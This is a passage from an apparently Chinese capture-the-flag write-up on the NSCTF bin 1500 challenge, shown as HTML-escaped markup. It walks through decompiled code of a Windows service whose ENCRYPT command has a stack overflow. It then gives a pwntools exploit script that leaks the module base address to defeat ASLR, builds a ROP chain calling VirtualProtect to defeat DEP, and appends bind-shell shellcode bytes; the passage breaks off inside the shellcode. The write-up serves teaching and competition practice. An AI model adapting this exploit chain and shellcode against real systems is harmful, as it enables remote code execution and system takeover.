Exit:SOCKET[%d]\n&amp;quot;, s);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_40177E(&amp;amp;buf, 1452, &amp;quot;Session Exit:SOCKET[%d]&amp;quot;, s);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        result = send(s, &amp;amp;buf, strlen(&amp;amp;buf), 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        if ( s == -1 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          return result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        return closesocket(s);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   ··· SNIP ···&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以发现只有三个操作，简单 Fuzz 下就会发现 ENCRYPT 函数会导致程序崩溃：&lt;br&gt;&lt;img src=&quot;/images/2015/09/28/nsctf-bin-1500-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;br&gt;接下来需要做的就是具体的分析 ENCRYPT 函数。&lt;/p&gt;
&lt;h2 id=&quot;分析溢出函数&quot;&gt;&lt;a href=&quot;#分析溢出函数&quot; class=&quot;headerlink&quot; title=&quot;分析溢出函数&quot;&gt;&lt;/a&gt;分析溢出函数&lt;/h2&gt;&lt;p&gt;跟进 10C0 可以看到函数取了输入的前两位并将剩余的一起放入 1030 中：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __cdecl sub_4010C0(SOCKET s, int a2)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  unsigned __int16 v2; // cx@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  char buf[4]; // [sp+10h] [bp-204h]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  char v5; // [sp+14h] [bp-200h]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v2 = *(_WORD *)a2;                            // a2 =&amp;gt; ABCEEFG&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                                                // v2 =&amp;gt; AB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  *(_DWORD *)buf = *(_WORD *)a2;                // buf =&amp;gt; ecx =&amp;gt; ABCDEFGH前两字节 =&amp;gt; AB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  sub_401030(v2, (int)&amp;amp;v5, a2 + 2);             // a2+2 =&amp;gt; CDEFGH&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  send(s, buf, 2, 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return send(s, &amp;amp;v5, *(unsigned __int16 *)buf, 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续跟进，终于看到真正的操作了。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __usercall sub_401030@&amp;lt;eax&amp;gt;(signed int a1@&amp;lt;ebx&amp;gt;, int a2, int a3)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v3; // eax@2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  signed int v4; // esi@2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v5; // edi@3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int result; // eax@5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v7; // edx@7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v8; // ecx@8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v9; // edi@9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( !byte_40F95C )                           // 异或表&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v3 = sub_401566(0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sub_4015B7(v3);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v4 = (signed int)dword_40F968;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      v5 = sub_4015C9() &amp;lt;&amp;lt; 16;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      *(_DWORD *)v4 = v5 + sub_4015C9();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      v4 += 4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    while ( v4 &amp;lt; (signed int)&amp;amp;dword_40F9E8 );&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    byte_40F95C = 1;                            // 只生成1次异或表&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  result = a1 / 4;                              // 控制异或次数&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( a1 &amp;amp; 3 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ++result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v7 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( result &amp;gt; 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v8 = a2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      v9 = *(_DWORD *)(a3 - a2 + v8) ^ dword_40F968[v7++ &amp;amp; 0x1F];// v7 =&amp;gt; edx、edi(edx计数、edi保存)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                                                // 取key and后保存在edi中&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                                                // 与输入异或保存在edi中&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      *(_DWORD *)v8 = v9;                       // memcpy！造成溢出。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      v8 += 4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    while ( v7 &amp;lt; result );&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看出前两个字符用于控制需要加密的数据大小，接下来的则是需要加密的数据。这里存在两个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;异或表只生成了一次，可以通过第一次异或的结果推导出 Key，进而可以控制第二次生成的密文。&lt;/li&gt;
&lt;li&gt;未对输入长度进行判断，导致了栈溢出。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;手工二分法大致判断出溢出长度为 500 到 1000 之间，通过&lt;code&gt;mona.py&lt;/code&gt;生成的字符串可以定位覆盖 EIP 的具体长度。&lt;/p&gt;
&lt;h2 id=&quot;对抗-DEP-amp-ASLR&quot;&gt;&lt;a href=&quot;#对抗-DEP-amp-ASLR&quot; class=&quot;headerlink&quot; title=&quot;对抗 DEP &amp;amp; ASLR&quot;&gt;&lt;/a&gt;对抗 DEP &amp;amp; ASLR&lt;/h2&gt;&lt;p&gt;就此题而言，对抗 ASLR 很简单，因为 &lt;code&gt;STATUS&lt;/code&gt; 命令会直接返回模块加载的基地址。通过 ROP 绕过 DEP，在 IDA 里可以看到官方给写好很多小配件（helper 段）：&lt;br&gt;&lt;img src=&quot;/images/2015/09/28/nsctf-bin-1500-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;/p&gt;
&lt;p&gt;结合这些小配件就可以编写出自己的 ROP 链，最终的 EXP 如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#coding: utf-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;HOST = sys.argv[1]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn = remote(HOST, 2994)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.newline = &amp;quot;\r\n&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# get welcome message&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# get addr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;try to get the base addr&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.sendline(&amp;quot;STATUS&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;base = int(conn.recv().strip()[-10:], 16)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;base addr =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(base)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# first encryption, to get the table&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;send the first packet, try to get the table&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.sendline(&amp;quot;ENCRYPT \x80\x00&amp;quot; + &amp;quot;\x00&amp;quot;*0x80)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;table = conn.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# second encryption, exploit it&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;send the second packet, try to exploit it&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = &amp;quot;\x90&amp;quot; * 0x200&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# save esp to eax, ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1001)              # mov eax, esp; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1004)              # mov ebx, eax; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# point ebx to shellcode&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1015)              # add ebx, 20; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1015)              # add ebx, 20; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1015)              # add ebx, 20; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1015)              # add ebx, 20; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1015)              # add ebx, 20; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# point eax to parameter1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100e)              # add eax, 10; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100e)              # add eax, 10; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100e)              # add eax, 10; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100e)              # add eax, 10; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100e)              # add eax, 10; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x3814)              # pop ecx; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(0x4)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x5c0a)              # sub eax, ecx; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# modify parameter 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1007)              # mov dword ptr ds:[eax],ebx; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# point eax to ret addr &amp;amp; modify ret&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x100a)              # sub eax, 4; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x1007)              # mov dword ptr ds:[eax],ebx; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# call VirtualProtect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(base+0x101b)              # push kernel32.VirtualProtect; retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;AAAA&amp;quot;                         # ret&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;BBBB&amp;quot;                         # lpAddress&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(0x200)                    # dwsize&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(0x40)                     # flNewProtect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += pack(0x00010000)               # lpflOldProtect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x90&amp;quot; * 0x10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# shellcode for bind shell&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0&amp;quot;&lt;/div&gt;&lt;div 